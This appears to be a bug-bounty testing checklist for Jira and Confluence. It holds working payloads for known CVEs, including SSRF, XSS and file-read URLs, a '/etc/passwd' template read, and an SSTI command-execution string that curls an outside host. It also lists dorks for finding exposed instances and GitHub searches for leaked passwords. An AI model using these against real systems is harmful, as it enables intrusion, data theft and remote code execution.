# Atlassian Jira / Confluence

**What it is:** Atlassian Jira/Confluence ship a long tail of known CVEs (SSRF, XSS, file read, user/project enumeration, OGNL injection) plus permission misconfigs. Version-match first, then walk the CVE list. Unauthenticated enumeration and dashboard/gadget exposure are common quick wins.

## Where to look
- [ ] Fingerprint: `/secure/Dashboard.jspa`, `X-AUSERNAME` header, `atlassian.xsrf.token` cookie, `/rest/api/2/`.
- [ ] Scanners: `jLoot`, `Jiraffe`, `jira_scan`, `Jira-Lens`, nuclei jira/confluence templates.

## Permission / enum quick checks (often unauth)
- [ ] **Privilege check:** `/rest/api/2/mypermissions` or `/rest/api/3/mypermissions` — any `"havePermission": true` while unauthenticated = finding.
  ```
  curl https://jira.target.com/rest/api/2/mypermissions | jq | grep -iB6 '"havePermission": true'
  ```
- [ ] User enum: `/rest/api/2/user/picker?query=<name>`, `/secure/ViewUserHover.jspa?username=<user>`, `/secure/popups/UserPickerBrowser.jspa`.
- [ ] Group/user dump: `/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true`.
- [ ] Project key enum (+ possible unauth project access): `/browse.<project_key>`.
- [ ] Dashboards/filters exposed: dorks `inurl:/ConfigurePortalPages!default.jspa?view=popular`, `inurl:/ManageFilters.jspa?filterView=popular`, `inurl:/UserPickerBrowser.jspa`.

## CVE checklist
- [ ] **CVE-2017-9506** (SSRF): `/plugins/servlet/oauth/users/icon-url?consumerUri=<ssrf>`
- [ ] **CVE-2018-20824** (XSS): `/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)`
- [ ] **CVE-2019-8451** (SSRF): `/plugins/servlet/gadgets/makeRequest?url=https://<host>:1337@example.com`
- [ ] **CVE-2019-8449** (user info disc): `/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true`
- [ ] **CVE-2019-8442** (sensitive info disc): `/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml`
- [ ] **CVE-2019-3403** (user enum): `/rest/api/2/user/picker?query=<user>`
- [ ] **CVE-2019-3402** (XSS): `/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search`
- [ ] **CVE-2019-3396** (path traversal / RCE) — `POST /rest/tinymce/1/macro/preview` with `_template: file:///etc/passwd`:
  ```
  {"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"}}}
  ```
- [ ] **CVE-2019-11581** (SSTI / template injection): `/secure/ContactAdministrators!default.jspa`, SSTI in subject/body:
  ```
  $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://xyz.burp.net').waitFor()
  ```
- [ ] **CVE-2020-14179** (info disc): `/secure/QueryComponent!Default.jspa`
- [ ] **CVE-2020-14178** (project key enum): `/browse.<project_key>`
- [ ] **CVE-2020-14181** (user enum): `/secure/ViewUserHover.jspa?username=<user>`
- [ ] **CVE-2022-26135** (full-read SSRF, Mobile Plugin) — authenticated `POST /rest/nativemobile/1.0/batch` with `{"requests":[{"method":"GET","location":"@example.com"}]}`. Exploit: `https://github.com/assetnote/jira-mobile-ssrf-exploit`
- [ ] **CVE-2018-5230** (XSS): `/issues/?filter=-8` → "Updated Range" fields, single quotes only, 15-char limit box. Ref H1 380354.
- [ ] **CVE-2020-29453** (pre-auth limited arbitrary file read): `/s/1x/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml` (curl if it redirects to login).
- [ ] **CVE-2020-36287** (incorrect authz, dashboard gadget prefs leak): `/rest/dashboards/1.0/10000/gadget/{ID}/prefs`. PoC: `https://github.com/f4rber/CVE-2020-36287`
- [ ] **CVE-2020-36289** (unauth user enum): `/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin`
- [ ] **CVE-2021-26086** (limited RFI/file read, Jira 8.4.0): `/_/;/WEB-INF/web.xml`, `/_/;/WEB-INF/classes/seraph-config.xml`, `/_/%3B/WEB-INF/web.xml` (semicolon + `%3B` variants). PoC: `https://github.com/ColdFusionX/CVE-2021-26086`
- [ ] **CVE-2022-0540** (Jira auth bypass): `https://github.com/Pear1y/CVE-2022-0540-RCE`
- [ ] **CVE-2021-26084** (Confluence Webwork OGNL injection → RCE): `https://github.com/march0s1as/CVE-2021-26084`

## Dorks
```
inurl:"/plugins/servlet/Wallboard/"
inurl:"dashboard.jspa"
inurl:xyz intitle:JIRA login
site:*/JIRA/login
intext:"Welcome to JIRA" "Powered by a free Atlassian Jira community"
inurl:/ContactAdministrators!default.jspa
inurl:/secure/attachment/ filetype:log OR filetype:txt
```
GitHub recon for leaked secrets: `"target.com" client_secret`, `"jira.target" pwd/pass/password`, `"target.atlassian" password`.

## Impact
SSRF → cloud metadata (`09-advanced/06`); OGNL/SSTI → RCE; file read → source/creds; unauth enum → user/project harvest for further attacks.

## Report notes
Match the exact version to the CVE before claiming it. For SSRF, hit your own collaborator. For file read, pull a non-sensitive marker file. Do not run destructive OGNL.
